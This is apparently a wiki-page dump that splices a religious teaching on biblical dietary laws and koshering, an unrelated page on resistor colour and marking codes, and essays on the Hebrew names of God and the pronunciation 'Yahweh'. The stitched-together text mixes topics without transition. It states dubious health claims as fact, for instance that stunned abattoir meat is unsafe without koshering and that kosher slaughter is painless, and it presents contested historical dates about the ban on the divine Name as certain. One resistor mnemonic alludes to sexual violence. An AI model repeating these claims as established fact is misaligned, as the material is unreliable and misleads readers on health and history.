We are not to ingest the soulish life of any animal that we eat.  Not only are we eating the life in the physical elements of that animal, but we are also ingesting everything that it carried in its blood. The function of blood is to circulate through the body carrying oxygen and nutrients to cells and organs and waste products and poisons away from those cells, to the excretory ducts in the body.  Also present in an animal's blood are the bacteria, viruses, infections, hormones, drugs and other microorganisms, according to its state of health and its diet. Infectious diseases can be transmitted to man by ingesting the blood of diseased animals and there are definite consequences and effects to this consumption of animal blood. This is true even within the kosher/clean classification of animals. 

In today's methods of feeding animals, there are a lot of unnatural substances fed to them to obtain a quick return.  It is common practice to give herbivore animals concentrated high protein substances which have been made from ground up remains of other dead animals and other refuse material, fortified with hormones, vitamins and minerals to promote quick growth of flesh and fat on the skeletal framework of the animal.

The scriptures teach us that we may eat clean meats as long as the blood is not in it. Once the blood has been removed from the meat of a clean animal and the meat is fully cooked, it is perfectly safe, healthy and beneficial for the human diet. 

==THE PRINCIPLE OF FAT PROHIBITION==
&quot;You shall not eat any fat, of ox or sheep or goat. And the fat of an animal that dies naturally, and the fat of what is torn by wild beasts, may be used in any other way; but you shall by no means eat it. For whoever eats the fat of the animal of which men offer an offering made by fire to Yahweh, the person shall be cut off from his people.&quot;  Leviticus 7:23-25

We now know medically that the consumption of fat raises the cholesterol and triglyceride levels  in human arteries and veins. This in turn causes atherosclerosis. A diet rich in animal fats causes heart problems.  It has also been linked to Pancreatic and Colorectal Cancers 	(Diseases, 1983, pp.224,228). 

==THE NEW COVENANT DECREE==
With the admission of &quot;Gentiles&quot; into the Church, the apostles decreed that the only ruling that they would make at that time was to uphold the prohibition of blood and things strangled, as well as things offered to idols and immorality; as the basic necessities for communal relationship with the believers (Acts 15:28-29).

The rest they would learn as they continued to fellowship week by week and learned the teachings of Moses. But the abstinence from eating blood directly and indirectly from things which had been strangled, rather than by proper slaughter, were immediate issues. Strangling causes the blood to become congealed in the flesh.

Modern methods of slaughtering animals by stunning them, are similar to strangling, in that the blood is not released quickly enough from the body for it to properly drain.  By stunning the animal, in the involuntary reaction of shock through the nervous system, a boost of adrenaline is sent through the body which causes some of the blood to congeal in the tissues.  Therefore, meat slaughtered in modern abattoirs is not suitable to be eaten without being treated. This means that we should drain the blood from any meat we intend to eat (koshering) and not to eat things made from blood, like blood sausage, or other bodily organs which contain blood in them.

==THE CONSUMPTION OF MEAT==
&quot;You shall not eat of anything that dies of itself: you may give it to the foreigner living among you who is within your gates, that he may eat it; or you may sell it to a foreigner: for you are a consecrated people to Yahweh your God. You shall not boil a kid in its mother's milk.&quot;  (Deuteronomy 14:21) 

:The Hebrew word that is translated as &quot;dies of itself&quot; is &quot;nevelah&quot; which is a term for anything which has died in any other way other than by ritual slaughter (shehitah).

From the ruling of the Jerusalem council (Acts 15:28-29), former Gentiles who are grafted into the Olive tree of Israel, are required to observe the abstinence from blood and are no longer classed as a &quot;Gentile&quot; with the &quot;liberty&quot; to eat flesh which is contaminated by blood in its tissues and therefore, &quot;unclean&quot;. See Ephesians 2:19; Romans 11:17-18. To do so is breaking God's commandments.  See Isaiah 65:2-4.


DIETARY LAWS from the Encyclopaedia Judaica, Volume 6, page 28., Koshering (Preparation of Meat) 
The prohibition against the consumption of blood (Lev.7:26-27-17:10-14) is the basis for the process of koshering meat. The purpose of the process is to draw out and drain the meat of non-veinal blood, before it is cooked. The blood can be removed either by salting the meat, or by roasting it over an open flame. 
Grilling meat will also draw the blood out of the flesh of it.  It should be washed before and after cooking.

In koshering meat, a sodium or salt solution has a dehydrating effect which draws the water and blood from the animals tissues.  This is done by the process of osmosis, as water moves from the substance of a higher concentration to one of  a lower one.  The salt solution dries out the meat to a point where no bacteria can grow and cause putrefaction of the meat.  The effect on bacteria that are already present is to kill them immediately by depriving them of needed moisture.  This kosher curing and preservation method has been used since the beginning, to prepare meat for safe consumption.  This also prevents the growth of moulds, fungi and yeasts. 

Meat should be koshered within 72 hours after slaughter so as not to permit the blood to congeal. The sciatic nerve, innards and the fat should first be removed. Then the meat should be soaked for half an hour, drained and then salted on all surfaces and set aside on a perforated surface to allow the blood to drain through it.  The salt will draw out the blood in the flesh in a few hours. Wash the flesh of the meat again to remove the salt and cook it.

Ritual Slaughter (Shechita):
&quot;Only a trained kosher slaughterer (shochet) whose piety and expertise have been approved by rabbinic authorities is qualified to slaughter an animal. The trachea and esaphagus of the animal are severed with a special razor-sharp, perfectly smooth blade causing instantaneous death with no pain to the animal.  After the animal has been properly slaughtered, a trained inspector (bodek) examines the internal organs for any physiological abnormalities that may render the animal non-kosher (treif).  There are special cutting procedures for beef, veal and lamb, called &quot;Nikkur&quot; in Hebrew. Many blood vessels, nerves, and lobes of fat are forbidden and must be removed; a costly and time-consuming procedure.&quot; (Orthodox Union) 

Done correctly, a kosher slaughter causes very little or no discernible suffering to the animal as it is rendered insensate almost immediately. Both the Humane Slaughter act and PETA (People for the Ethical Treatment of Animals) have acknowledged that kosher slaughter is more humane than the common method.

      <text xml:space="preserve">[[File:Resistor Carbon-film 0.25W Coloured.svg|thumb|A through-hole mounted resistor with untrimmed leads. This is a 10kΩ, 5% tolerance resistor.]]

==Resistor colour code==
Resistors are lablelled to allow you to see what their nominal value is. A &quot;standard&quot; through-hole mounted resistor has coloured bands painted onto it. These bands denote the value. Depending on the tolerance of the resistor, these my be 4, 5, or 6 bands on a resistor.

{{:Engineering Tables/Electronic colour codes}}

There are some menonics to remember the sequence of color code in the above table. A few of them are as follows:
:* Bad Boys Race Our Young Girls, But Violet Generally Wins.
:* Better Be Ready, Or Your Great Big Venture Goes West.
:* B. B. ROY of Great Britain has a Very Good Wife.

==Number codes==
[[File:Zero ohm resistors cropped.jpg|thumb|SMT resistors (27Ω and 0Ω) ''in situ''.]]
Surface mount resistors are too small for coloured bands to be easily read, but they have a flat surface instead, so the value is usually marked un the top surface of the device. This code is much the same as the colour code above, but explicitly written.

So, the code is written as two or three (depending on the tolerance of the device) numbers, followed by a multiplier digit, giving a three- or four-digit designation.

For example:
* A 1kΩ resistor can be marked &lt;tt&gt;102&lt;/tt&gt; or &lt;tt&gt;1001&lt;/tt&gt;.
* A 470kΩ resistor can be marked &lt;tt&gt;474&lt;/tt&gt; or &lt;tt&gt;4703&lt;/tt&gt;.

When the resistance is less than 100Ω, you must be careful, as the number may be mistakenly read as explicit. (We will deal with only 3-digit codes now):
* A 100Ω resistor can be marked &lt;tt&gt;101&lt;/tt&gt; (i.e. 1, 0, followed by ''one'' zero)
* A 47Ω resistor is then marked &lt;tt&gt;470&lt;/tt&gt; (i.e. 4, 7, followed by ''no'' zeros), or, to reduce chance of error, just &lt;tt&gt;47&lt;/tt&gt; (there is no multiplier)

When the resistance is less than 10Ω, a capital &quot;R&quot; is used as a decimal point:
* An 8.2Ω resistor is marked &lt;tt&gt;8R2&lt;/tt&gt;
* A 0.1Ω resistor is marked &lt;tt&gt;0R1&lt;/tt&gt;

&quot;Jumper resistors&quot; have no resistance and are used to bypass tracks on a PCB. These are usually labelled &lt;tt&gt;000&lt;/tt&gt; or just &lt;tt&gt;0&lt;/tt&gt; .</text>

      <text xml:space="preserve">==KNOWING GOD==
God as the Creator of all things desired His creation to know Him.
His creation of Adam was for the purpose of relationship.  God the Father wanted a son with whom He could communicate, educate and train up to maturity so as to share with, and include him in His  purposes.

“Eye has not seen, nor ear heard, nor have entered into the heart of man the things which God has prepared for those who love Him”	1 Corinthians 2: 9

Knowing Him involves personal relationship – going beyond knowing Him as Creator.

Relationship is interaction of one person in their individuality to another.   It involves knowing the other person's character and the attributes of their personality, their capacities and capabilities. Such is what the Father envisages for His 'sons'.

He intimately knows everything about us, but He desires that we might reciprocate His love by also desiring to really know Him, and not merely know about Him.   He has made known the essence and nature of His being in the Word so that we may understand Him in His character and the various other qualities of His being.


1.  KNOWING HIM AS 'EL'  -  THE MIGHTY ONE

“El” is the most basic Hebrew word for 'God'.    This is in the singular form and is the title that proclaims Him as “the mighty One”.    Strongs Concordance 410 gives the meaning of 'el' as 'mighty' from a shortened form of 352 meaning 'strength'.

The name 'El' is an ancient Semitic term for the deity and was a frequently occurring name for the deity in proper names in the ancient Semitic cultures.  It was not used just as a generic term, but for a personal deity as proved by the Ugaritic texts.  (by Pope p.1 &amp; 19  of  'El' in the Ugaritic Texts)

It is used 250 times in the scriptures and mostly with other epithets to denote His greatness and superiority over other 'gods'. It is not often used alone. From its root meaning it signifies “strong”, “first”,  as the Great First Cause of all.

The attributes of God are usually attached to the title 'El', such as “El Elyon”,  'the Most High God' (Genesis 14:22)
“El Olam”  the everlasting God (Genesis 21:33) etc..


2. KNOWING HIM AS 'ELOAH' or 'ELOHIM'  -  THE ONE TO BE WORSHIPPED

“Eloah” is the singular form Strongs 433,  and comes from 'Ahlah' to worship or to adore, and presents Him as the supreme object of worship.   This word occurs about 65 times in the original.

“Elohim” is the plural form of &quot;Eloah&quot; Strongs 430, occurring about 2,500 times.  It is often used with verbs and pronouns which are singular indicating the oneness of God, as being One Person and not plural Persons.    The plural form of the noun “Elohim” is termed a 'majestic plural' as of His greatness, His expansiveness and His majesty of Person.  This form occurs only in Hebrew and not in Aramaic or in any other of the Semitic languages,  conveying the idea of the  unity of the One God yet allowing for an expansiveness of His Being.

“Elohim” is not however the personal name for 'God' but is a descriptive title, which is also be used for other objects of worship, and for  “mighty ones”,  when speaking of angels.  (2 Chronicles 13:9;  Isaiah 37:19)

It is somewhat equivalent to our term 'God'.   When used in reference to the Supreme Being,  the word's inherent idea of creative and governing power,  and of omnipotence and sovereignty comes into force.   It is used for His attributes of might, power, justice and kingship.

==ELOHIM IN CREATION==
Elohim is the term used in Genesis 1,  as creation was a creative act involving the plurality of the deity in  His operation of forming order out of chaos.

The initiation of the 'plan' was within the Father's heart, spoken out by the Eternal Word and performed by the Spirit.    The Eternal Son, the Word “spoke, and it was done; He commanded and it stood fast.” !  verse 9 of Psalm 33: 6-9;   “By the word of Yahweh the heavens were made, and all the host of them by the breath of His mouth.” (v. 6)

In Genesis 1:2 we see the action of the Spirit of God brooding over the watery chaos to bring forth the Word of Elohim as He spoke it into existence in our physical realm.

“For by Him (the Son) all things were created that are in heaven and that are on earth, visible and invisible, whether thrones or dominions or principalities or powers.   All things were created through Him and for Him.   And He is before all things, and in Him all things consist.”	Colossians 1:16-17

The Spirit is the energizing power through which the will of the Father, executed through the Son, is brought into being.

==Y'SHUA THE REVELATION OF THE GODHEAD IN THE NEW COVENANT==
We understand that Y'shua is the Son of God and yet He is also called “the everlasting Father” in Isaiah 9: 6 and spoken of as being “in the bosom of the Father”  (John 1:18), and in answer to the Jews accusation that He was making Himself equal to God, He said,  &quot; the Father is in Me, and I in Him&quot;;  and,  &quot;I and the Father are one&quot;.   (John 10:38b, 30)   “For He whom God has sent speaks the words of God, for God does not give the Spirit to Him by measure.”   (John 3:34)

The Father dwelt in the Son by His Spirit within the limitations of physical flesh, so that it can be said,  that, 
:“He is the image of the invisible God”  (Colossians 1:15)  
:“For in Him dwells all the fullness of the Godhead bodily;”  (Colossians 2: 9)

==KNOWING HIM AS YAHWEH  -  COVENANT RELATIONSHIP==
Yahweh is the personal sacred Name of the Almighty revealed to His people as His memorial Name for all generations.   In the Hebrew it is four letters YHVH or YHWH.   Those letters are  YOD, HAY, WAW, HAY

It is called the Tetragrammaton which means 'the four letters'.   
Josephus in his 'Wars of the Jews'  from the passage on Exodus 28:1-43 says that the priests tiara had a crown “whereon were embossed the sacred letters, to wit, four vowels”  thereby revealing  that these were four vowels and not consonants as is commonly supposed.

The Tetragrammaton YHWH (the Name Yahweh) is used 7,000 times in the scriptures and is the Almighty's signature to everything He says, endorsing it with His personal Name.

:In Strongs it is 3068 coming from, as supposed, the primitive root 1961 of the verb “to be”  HAWA  	i.e. To become, to come to pass.

When He reveals Himself to Moses in Exodus 3:14, the simple imperfect of the verb “to be” HAWA is used, which would be understood to mean “I am what I am” or,  “I am present is what I am”.  Here He is spelling out as it were, the significance of His Name in being ever-present with His people to be what they need Him to be.

The 'faithful Presence' is God's testamentary nature or name.   Exodus 6:2,4; Deuteronomy 7:9; Isaiah 26:4

His Name says what He is  -  The Eternal faithful divine Presence in covenant relationship.

He is the Ever-Present, Self-existent, Self-sustaining, Eternal One Who has life in Himself to impart to His people.


In verse 16 of Exodus 3, Yahweh tells Moses to say to Israel,  
“the LORD God of your fathers, the God of Abraham, of Isaac, and of Jacob, appeared to me”  (KJ Version has LORD in capitals wherever 'Yahweh' is in the original).   So it should read, &quot;Yahweh the God of your fathers, the God of  Abraham ... ..&quot;  (Interlinear Bible - Hendrickson)

Here He identifies Himself as the One who appeared to the fathers and entered into covenant with them, and now,  is revealing Himself again and renewing the covenant with the nation to lead them out of bondage.

==PERSONAL COVENANTAL RELATIONSHIP==
In Genesis Chapter 1 when Yahweh is spoken of in relation to creation, the generic term 'Elohim' is used.

But, when it comes to His personal interaction in the garden in Chapter 2 it is Yahweh  (&quot;the LORD God&quot;, as translated by the King James Version).   His personal name is used all throughout from Genesis 2: 4 onwards as Yahweh prepares the garden and creates Adam from the elements of the earth.   He was known by His personal Name Yahweh to Adam and Eve as is evidenced by Eve saying in Chapter 4:1,   &quot;I have acquired a man from Yahweh&quot;.

All of the patriarchs knew Him by His Name, but they did not know the depth of covenantal relationship carried in the Name, until revealed to Moses.   For with Israel He committed Himself to an irrevocable covenant in fulfillment of the promise to Abraham.  Deuteronomy 7:6-11; 29:1-15, 29  Luke 1:68-75

&quot;Yahweh your God has chosen you to be a people for Himself, a special treasure above all the peoples .. .. because Yahweh loves you and because He would keep the oath which He swore to your fathers ..&quot;  Deuteronomy 7: 6, 8

&quot;All of you stand today before Yahweh your God, ..  ..  ..  ..  that you may enter into covenant with Yahweh your God, and into His oath, which Yahweh your God makes with you today  ..  ..  
&quot;I make this covenant, and this oath, not with you alone, but   ..  ..  ..  as well as with him who is not here with us today.&quot;   Deuteronomy 7:10, 12, 14,15

&quot;For when God (Yahweh) made a promise to Abraham, because He could swear by no greater, He swore by Himself, .. ..     &quot;Thus God (Yahweh), determining to show more abundantly to the heirs of promise the immutability of His counsel, confirmed it with an oath, that by two immutable things, in which it is impossible for God (Yahweh) to lie, we might have strong consolation, who have fled for refuge to lay hold of the hope set before us.&quot;   Hebrews 6:13,17,18

When He spoke to Moses, He said, &quot;I am Yahweh, I appeared to Abraham, to Isaac, and to Jacob, as God Almighty, but by My Name Yahweh I was not known to them.&quot;   Exodus 6: 2-3

The verb 'known' - YADA means according to the Theological Wordbook, 'know but not in the fullest sense'.   The Interlinear Bible translates it as 'revealed'.   So although He came and gave the promises to them, they knew Him in their experience as the mighty 'EL',  and not by the fullness of His covenant nature.

&quot;The Name was in use, but not appreciated in the redemptive significance revealed to Moses&quot; quoted from Th.Wordbook	(J.A. Motyer &quot;The Revelation of the Divine Name' from The Theological Wordbook)

Westminster Dictionary of the Bible Quote:
&quot;The name means: 'He who happens (upon us), he who befalls us, he who in the absolute sense exists and who manifests his existence and his character.' (Exodus 3:13-15) The creator, upholder and moral governor of the universe is 'elohim', God; the covenant God of Abraham, Isaac and Jacob; the God in whom lay their 'present strength' and their hope for 'future existence' is El Shaddai ('El Shadday) God Almighty;  but the God of revelation and grace, dwelling with his people, guiding and delivering them and receiving their worship is Jehovah. 

The Theological Wordbook states regarding the Name, that &quot;It connotes God's nearness, His concern for man, and the revelation of His redemptive covenant&quot;.   Therefore only those who enter into covenant really know His Name.
:Note  -  &quot;Elohim shall enlarge Japheth&quot;  Genesis 9:27

:::but,  &quot;Yahweh the God of Shem&quot;             	     :26
:::and,

:&quot;The heavens declare the glory of God     Psalm 19: 1
::the law of Yahweh is perfect                           : 7


&quot;He (Yahweh v.6) made known His ways to Moses, His acts to the children of Israel&quot;   Psalm 103: 7

Through rebellion they did not enter into covenant intimacy and only knew Him by His works.


But, in the New Jerusalem,   &quot;Yahweh is there&quot;  -    YHWH SHAMMA  Ezekiel 37:26


&quot;They shall see His face, and His name shall be on their foreheads.   There shall be no night there:    They need no lamp nor light of the sun, for the Lord God (Yahweh) gives them light.   And they shall reign for ever and ever.&quot;   Revelation 22: 3-5

      <text xml:space="preserve">Until the beginning of the nineteenth century the Name of Yahweh had fallen into disuse, but now it is being restored to His covenant people.

==HISTORY OF THE USAGE OF THE NAME==
The Name is represented by the Hebrew letters Yod-Heh-Wav-Heh (YHWH).  
It is often referred to in Judaism as the &quot;Unutterable Name&quot;.
   
In scripture, this Name is used when discussing God's relationship to humanity, and when emphasizing his qualities of loving kindness and mercy. It is frequently shortened to Yah (Yod-Heh), Yahu or Yeho (Yod-Heh-Waw), especially when used in combination with names or phrases, as in Yehoshua (Joshua, meaning &quot;the Lord is my Salvation&quot;),  and Halleluyah (&quot;praise the Lord&quot;).

It is evident from scripture that God's Name was pronounced in normal worship and discussion. Many common Hebrew names contain &quot;Yah&quot; or &quot;Yahu,&quot; part of God's four-letter Name. The Name was also pronounced as part of daily services in the Temple.

The Mishnah confirms that there was no prohibition against pronouncing The Name in ancient times. In fact, the Mishnah recommends using God's Name as a routine greeting to a fellow Jew (Berakhot 9:5). 

Unger's Bible Dictionary says that inscriptions from the 1st and 2nd century B.C. Indicate that Yahweh was the Name used by the Hebrews. (p. 1177)

The Jewish Encyclopedia of 1901 says, &quot;In the early period of the second temple the Name was still in common use, ....... At the beginning of the Hellenistic era, however, the use of the Name was reserved for the temple ......  It appears that the priests were allowed to pronounce the Name at the benediction only in the temple; elsewhere they were obliged to use the appellative name of &quot;Adonai&quot; ....     Pronunciation of the Name by the temple priests ... also gradually fell into disuse.  Tosef Sotah  &quot;from the time Simon the Just died [this is the traditional expression for the beginning of the Hellenistic period], the priests refrained from blessing the people with the Name.   Formerly they used to greet each other with the ineffable Name; When the decline of the study of the law came the elders mumbled the Name.&quot;  Vol.1 p. 201-202

The Name began to be suppressed when Israel went into dispersion among the pagan nations in 586 B.C..   The Babylonians referred to them as “Yahudim” and to ridicule them began to call them “Yahoo's”.   Hearing the Name blasphemed on the lips of pagans was so offensive, the use of it became avoided.   Over time what was an avoidance of saying the Name,  to keep it from being taken in vain,  evolved into it being banned by the rabbis in 400 BC as a result of Hellenistic influence.  
 
This came from the pagan concept in the secret mysteries,  of hiding the name of the 'god' to all but the initiates. They adopted this from the Babylonians and the Greeks which each had held their period of dominion over Israel, one after the other. Later further restrictions were imposed, making only the high priest able to pronounce the Name on the Day of Atonement. From this time onwards in 290 BC, if any other than the high priest pronounced the Name it meant a death sentence.

Craig Emsweller quotes from the book “The Old Rabbinic Doctrine” by Rabbi A. Marmostein, saying,
“There was a time when this prohibition of not using the divine name was entirely unknown among the Jews  .... neither in Egypt, nor in Babylonia, did Israel know or keep a law prohibiting the use of God's name, the ... Tetragrammaton, in ordinary conversations or greetings.   Yet from the third century BC to the third century CE, such a prohibition existed and was partly observed.”

Not only was the use of the Name allowed in earlier times, but it was used freely and openly used even by laymen,  as quoted in the book of Dr. Cohen “Every Man's Talmud”  -  “it was Yahweh Himself who announced His Name and told worshipers to use it.”   It was the combined pressure of the Hellenistic opposition to the Jewish religion and the apostasy of the priests and nobles, which led to the introduction of the ban in using the Name.

==DISTORTION OF THE NAME==
The earliest inscription of His Name is on the Moabite Stone in ancient Hebrew script, dated 890 BC.

Murashu texts from the fifth century BC reveal that names of people with prefixes of the Name started with the spelling of YAHU (IAU in Greek).   These texts were written before the Talmud,  and the scribes who wrote them were not under a compulsion to hide or disguise the Name as were the Masorites in the seventh century AD,  and therefore their texts are more valid historically and linguistically.

The Encyclopedia Britannica (Micropedia vol.10) states regarding Yahweh's personal name  &quot;The Masorites, Jewish Biblical scholars of the Middle Ages, replaced the vowel signs that had appeared above or beneath the letters of YHWH with the vowel signs of Adonai or of Elohim.&quot;

This was done to disguise the Name so that it would not be pronounced,  according to the instruction given in the Mishnaic text of Tamid vii 2 (=Sota vii. 6),  so that anyone reading the Tetragrammaton would be inhibited from vocalising it as &quot;Yahweh&quot;. Instead of using the first vowel diacritical marking of 'a' in Adonai, they used an 'e' so that the reader would be saying 'Yeh' and not the true 'Yah' form.  Thus the vowel markings were an attempt to mislead, rather than to indicate the true pronunciation of the Name.

However, by the time the Talmud was written, it was the custom to use substitute Names for God. Some rabbis asserted that a person who pronounces YHWH according to its letters (instead of using a substitute) has no place in the World to Come, and should be put to death.  Instead of pronouncing the four-letter Name YHWH, &quot;Adonai,&quot; or &quot;Ha-Shem&quot; (lit. The Name) was substituted.

With the Temple being destroyed and the prohibition on pronouncing The Name outside of the Temple in force,  the pronunciation of the Name fell into disuse.  Scholars passed down knowledge of the correct pronunciation of YHWH for many generations, but eventually it was lost in common usage.

The commandment not to erase or deface the name of God comes from Deuteronomy 12: 3. There, the people are commanded that when they took the promised land, they should destroy all items related to the idolatrous religions, and should destroy the names of all local deities,  then they are commanded not to do the same to God.   Jews today apply this by avoiding to write the Name,  in the event that it may be inadvertently destroyed.   Nothing in the Torah prohibits pronouncing or writing the Name of God.

==THE NAME JEHOVAH==
Some people render the four-letter Name as &quot;Jehovah,&quot; but this pronunciation is incorrect. The word &quot;Jehovah&quot; comes from the fact that the ancient Jewish texts used to put the vowels of the Name &quot;Adonai&quot; (the usual substitute for YHWH) under the consonants of YHWH to remind people not to pronounce YHWH as written. A sixteenth century German scribe, Peter Gallatin, confessor to Pope Leo X, while transliterating the Bible into Latin for him in 1518, wrote the Name out as it appeared in his texts, with the consonants of YHWH and the vowels of Adonai, and came up with the word JeHoVaH.  This invalid name has been widely circulated in Christian churches, to the point it is widely regarded by most to be the name of God...as used in Webster's New World Dictionary: College Edition states (on pages 766-767 and p. 1657)

In the Septuagint (written in Greek) which was used in the early Assembly, the Name of Yahweh was written in Hebrew into the text in gold Hebrew letters.   Being ignorant of Hebrew,  the readers of the text transliterated it incorrectly into Latin.

At that time “Y” was equivalent to “I” and “V” had the pronunciation of “W” which was then a double 'u' i.e. 'oo'.   It only later became a consonant.     The “I” was pronounced as such, an “ee” sound as in 'police'.  Dutch printers popularised giving the “I” a tail which then appeared as our “J” today, but at that time was pronounced as “I” (“ee”).   It was only later that the “J” became a consonant sound as it is today.   And so the hybrid form evolved from the misconception that the letters of the Tetragrammaton were consonants, combined with the vowels of “Adonai” (Hebrew for “Lord”).    This format of substituting the vowels of Adonai into the supposed consonants of YHWH has become accepted as the traditional concept, with the idea that only the knowledge of which vowels need to be inserted,  being lost.

Dr. J.B. Rotherham states in the preface of his Bible concerning the name 'Jehovah'  “Erroneously written and pronounced Jehovah, which is merely a combination of the sacred Tetragrammaton and the vowels in the Hebrew word for Lord, substituted by the Jews for JHVH, because they shrank from pronouncing the Name, owing to an old misconception of the two passages, Exodus 20:7 and Leviticus 24:16 .....   To give the name JHVH the vowels of the word Lord [ Heb Adonai] is about as hybrid a combination as it would be to spell the name Germany with the vowels of the name Portugal – viz., Gormuna.   The monstrous combination Jehovah is not older than about 1520 A.D.”

The Encyclopedia Britannica (Micropedia, vol.10) says,  “Yahweh – the personal name of the [El] of the Israelites  ... the Masorites, Jewish biblical scholars of the Middle Ages, replaced the vowels signs that had appeared above or beneath the consonants of YHWH with the vowel signs of Adonai or of Elohim. Thus the artificial name of Jehovah (YeHoWaH) came into being. Although Christian scholars after the Renaissance and Reformation periods used the term Jehovah for YHWH, in the 19th and 20th centuries biblical scholars again began to use the form Yahweh, thus this pronunciation of the Tetragrammaton was never really lost. Greek transcriptions also indicate that YHWH should be pronounced Yahweh”

Even the Jehovah's Witnesses which have promoted this form acknowledge that it is not correct in their book “Let Your Name Be Sanctified” p.16,18; and in their own translation of the scriptures they write “While inclining to  view the pronunciation 'Yahweh' as the more correct way, we have retained the form 'Jehovah' because of peoples familiarity with it since the 14th century.   Moreover it preserves equally with other forms, the four letters of the Tetragrammaton JHVH”.

James Moffatt uses the substitute “Eternal” in his Bible, but he also says in his preface, “Strictly speaking, this ought to be rendered 'Yahweh', which is familiar to modern readers in the erroneous form of 'Jehovah'.    Were this a version intended for the students of the original, there would be no hesitation whatever in printing 'Yahweh'.”

The King James, Today's English Bible and the NIV replace the Name Yahweh with the form &quot;LORD&quot;.

==PRESERVATION AND PRONUNCIATION OF HIS NAME ==
The Encyclopedia Britannica 15th edition says,  &quot;After that event (70 AD) the liturgical use of the name ceased, but the tradition was perpetuated in the Rabbinic schools; it continued also to be employed by healers. exorcists and magicians, and is found on many magical papyri.   It is asserted by Philo that only priests might pronounce it and by Josephus that those who knew it were forbidden to divulge it.   Finally the Samaritans shared the scruples of the Jews, except that they used it in the judicial oaths ....... The early Christian scholars therefore  easily learnt the true pronunciation.&quot;   Vol.12 p.995

We have recorded that Clement of Alexandria wrote that it was transliterated into Greek as IAOUE which as a transliteration retains the form of &quot;Yahweh&quot;. (d. 212)   Theodorit says that the Samaritans pronounce it as IAVE (d. 457 Vol 12)    (Journal of Biblical Literature, 25, p 50 and Jewish Encyclopedia, vol.9, p.161)

&quot;The pronunciation Yahweh is indicated by transliteration of the name into Greek in early Christian literature, in the Greek form of  IAOUE (Clement of Alexandria) or IABE (Theodoret - 'b' in Greek is pronounced 'v')..... Strictly speaking, Yahweh is the only 'name' of God.    In Genesis wherever the word shem ('name') is associated with the divine Being, that name is Yahweh&quot;    Eerdmans Bible Dictionary 1979 page 478.

Encyclopedia Britannica 15th  edition Volume 10 p. 786 also says &quot;Greek transcriptions also indicated that YHWH should be pronounced Yahweh.&quot;   As do most basic encyclopedias.

The Encyclopedia Judaica vol.7 pp.679 ,  “the true pronunciation of the Name YHWH was never lost.  Comparisons with transliterations of the name into other alphabets from very ancient times confirm that the name was pronounced very much like &quot;Yahweh&quot;  Most modern Bibles acknowledge the pronunciation was &quot;Yahweh&quot;  (N.K.J., R.S.V., R.E.B.)

Prof. Anson F, Rainey, professor of  Semitic linguistics at Tel Aviv University confirms that Yahweh is the correct pronunciation.  London Papryi, xlvi, 446-483

The Biblical Archeological Review, Sept.-Oct. 1994 confirms that from the evidence of the Hebrew language the Greek transliteration is correct.
Therefore we have assurance in knowing that Yahweh is the correct form and pronunciation of the Name.

      <text xml:space="preserve">==SANCTIFYING THE NAME==
“Who has ascended into heaven, or descended? .... .... Who has established all the ends of the earth?
What is His Name, and what is His Son's Name, if you know?”    Proverbs 30: 4

What is His Name?  -  do you know?

Both the writer of Proverbs and David knew the differing personalities of the godhead and their identification by Name. The use of the divine Name 'Yahweh' was current in their time and we know from Jewish literature that they identified the Son as the &quot;Word of Yahweh&quot; - the &quot;Memra&quot;. (Psalm 110: 1-2)
The Son was named for His earthly life by His Father as Yehoshua/Yeshua (Matthew 1:21) and we know and use the Son's Name, but the Name for the godhead which still applies to the Father has fallen into disuse. Part of the reason for this has been the mistranslation from the original texts using 'LORD' (in capitals) for the divine name 'Yahweh', as well as man-made traditions prohibiting it's use, contrary to scripture.

Yahweh named Adam, Adam named the animals and Yahweh changed men's names consistent with changes in their spiritual status, showing that names are very important.

What about the Father's Name?  Do we disrespect Him by not using His Name?
“You shall not take the Name of Yahweh your God in vain: for Yahweh will not hold him guiltless who takes His Name in vain.” Deuteronomy 5:11 Also Exodus 20: 7

What is it to take His Name 'in vain'?

Websters Dictionary gives the meaning of 'vain' as  --
“Having no real substance, value, or importance; empty; void; worthless; unsatisfying.”
“Destitute of force of efficacy; effecting no purpose; fruitless; ineffectual;”
Strongs 7723 gives the sense of being desolate, useless, false; and,
the Theological Wordbook says that the ”primary meaning of 'shaw' (vain) is emptiness, vanity” ... “it designates anything that is unsubstantial, unreal, worthless, either materially or morally.”

“The evidence points to the fact that taking the Lord's name (i.e. His reputation) “in vain” will surely cover profanity, as that term is understood today, or swearing falsely in the Lord's name. But it will also include using the Lord's name lightly, unthinkingly or by rote.”

Therefore to ignore, neglect to use the Name or pass over it's importance, in regarding it of no purpose for today, is taking it in vain. Just as using it so commonly as to be without the appropriate reverence and due honor. To remove His Name from being used, is to bring it to nothing and make it without value.

Y'shua prayed “Hallowed be Your Name”,  it could be translated “Let your Name be sanctified”  Matthew 6: 9

Understanding that Y'shua spoke in Hebrew/Aramaic the word which He used would have been YITKADESH meaning 'to be sanctified', 'magnified' and 'exalted'.   This is the antonym to profaning the Name.    Ezekiel parallels the two in Ch.36:23.  We either sanctify or profane His Name by our conduct.   Using His Name is exalting it,  as well as by portraying all that His Name represents in our lives.   The Rabbis understood that it was our holiness of life that sanctified His Name.   Leviticus 22:32  (Sifra 99d)

==SUBSTITUTING NAMES==
When the translators and the traditions of man substitute other titles for His name, they are robbing the people of the keys of knowledge. The translators have hidden the divine Name by using a substitute in the form of 'LORD' which is not a translation of the original text,  but a title and a substitute name.
As also,  those who use other titles such as Adonai (lord), HaShem (the Name) in common speech.   They are actually taking the liberty of changing what He is called, in contradiction to His own words. Exodus 6:2-3
The KJV translates the same word 'SHAW' (7723 vain) as 'false' in Deuteronomy 5:20 “bear false witness”

We therefore have the liberty of applying this to Yahweh, that we are not to take His Name falsely. If we use substitutes,  we are using a false name for Him.   It is not His true name.   Isaiah 42: 8

Because the name represents the reputation of the one named, a name should be treated with respect. God's Names, in all of their forms, should be treated with enormous respect and reverence.

In Ex. 3:13-22: Moses asks God what His &quot;name&quot; is. He is not asking &quot;what should I call you;&quot;, he is asking &quot;who are you; what are you like; what have you done.&quot; This is clear from Yahweh's response. He replies that He is eternal, that He is the God of our fathers, that He has seen our affliction and will redeem us .

==RELATIONSHIP BETWEEN HIS NAME AND CHARACTER==
Yahweh's Name is an extension of His being, expressing the qualities of His character and personality in relationship to His creation, and expresses the essence of the Hebrew word for existence.

In the ancient Semitic world a name had much more religious, personal, family, historical and geographical significance than in our Western Culture.   Since the name was considered to be descriptive of the essential nature of the person or thing, there was a conception of identity between the name and its bearer.   Names conveyed the nature and essence of the one named. 
Declaring one's name was a chief means of revealing or manifesting oneself   (Ex. 9:16; Josh. 9:9)

